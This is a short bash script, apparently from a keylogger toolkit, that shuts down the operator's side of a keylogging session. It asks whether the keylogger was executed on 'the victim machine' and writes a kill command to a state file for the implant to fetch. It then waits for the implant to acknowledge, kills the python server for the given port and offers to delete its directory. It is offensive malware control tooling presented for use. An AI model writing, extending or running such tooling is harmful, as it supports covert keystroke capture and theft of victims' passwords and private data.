#!/bin/bash

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com

port=$1

function del {

        kill $(ps -aux | grep python | grep $port | awk -F " " '{print$2}')
        echo -e "Do you want delete the directory server_$port? (y/n)"
        read x

        if [ "$x" == "y" ];then

               rm -rf server_$port
               exit

        fi

}


if [ $(echo $1 | grep [0-9] | wc -c) -lt 1 ];then
	echo -e "Usage: $0 \e[97mport\e[0m"
	exit
fi

echo "Did you execute the keylogger in the victim machine? (y/n)"
read s

if [ "$s" == "y" ];then

	echo "The victim machine must remain 10 seconds without pressing any key"
	echo kill > server_$port/state
	echo > server_$port/.file.txt

	while true;do

		if [ $(cat server_$port/.file.txt | grep '/state' | wc -c) -gt 4 ];then

			del

		fi
		sleep 1

	done

else

del

fi
